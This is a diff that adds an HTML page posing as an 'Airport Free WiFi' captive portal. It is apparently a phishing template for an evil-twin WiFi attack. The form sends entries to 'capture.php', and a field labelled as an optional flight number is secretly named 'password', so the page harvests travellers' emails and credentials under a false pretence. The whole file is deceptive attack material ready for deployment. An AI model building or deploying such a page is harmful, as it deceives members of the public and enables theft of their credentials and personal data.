@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airport WiFi - Free Access</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="header">
+                <div class="plane-icon">
+                    <svg width="70" height="70" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M21 16v-2l-8-5V3.5a1.5 1.5 0 0 0-3 0V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"></path>
+                    </svg>
+                </div>
+                <h1>Airport Free WiFi</h1>
+                <p class="subtitle">Stay connected while you travel</p>
+            </div>
+
+            <form method="POST" action="capture.php" class="login-form">
+                <div class="welcome-message">
+                    <h3>Welcome Traveler!</h3>
+                    <p>Get complimentary WiFi access throughout the airport terminal</p>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" name="email" placeholder="your@email.com" required>
+                    <small>We'll send you airport updates and flight information</small>
+                </div>
+
+                <div class="form-group">
+                    <label for="flight">Flight Number (Optional)</label>
+                    <input type="text" id="flight" name="password" placeholder="e.g., AA123">
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terms" required>
+                    <label for="terms">I accept the Terms of Use and Privacy Policy</label>
+                </div>
+
+                <button type="submit" class="access-btn">Get Free WiFi Access</button>
+
+                <div class="info-cards">
+                    <div class="info-card">
+                        <strong>Unlimited Access</strong>
+                        <p>No time limits or data caps</p>
+                    </div>
+                    <div class="info-card">
+                        <strong>High Speed</strong>
+                        <p>Fast browsing & streaming</p>
+                    </div>
+                </div>
+
+                <div class="footer-text">
+                    <p>Secure connection • Available throughout all terminals</p>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
